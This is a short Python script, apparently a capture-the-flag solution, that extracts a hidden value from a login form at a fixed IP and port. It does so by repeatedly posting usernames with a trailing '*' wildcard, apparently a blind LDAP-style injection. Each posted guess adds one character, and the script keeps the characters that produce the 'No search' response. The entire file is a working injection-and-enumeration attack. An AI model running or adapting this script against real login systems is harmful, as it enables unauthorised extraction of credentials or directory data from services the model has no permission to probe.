import requests

url = 'http://134.122.104.185:31496/login'
data = {'username':'value','password':'*'}
result = ''
positive_str = 'No search'

list =[
    'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
    'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
    '0','1','2','3','4','5','6','7','8','9',
    '!','"','#','$','%','&',"'",'(',')','+',',','-','.','/',':',';','<','=','>','?','@','[',']','^','_','`',
    '{','|','}','~'
]

def auth(data):
    return positive_str in requests.post(url, data=data).text


flag = 1
while flag == 1:
    data['username'] = result
    if(auth(data)):
        break
    for l in list:
        data['username'] = result + l + '*'
        if(auth(data)):
            result += l
            print(result)
            break
print("Done")

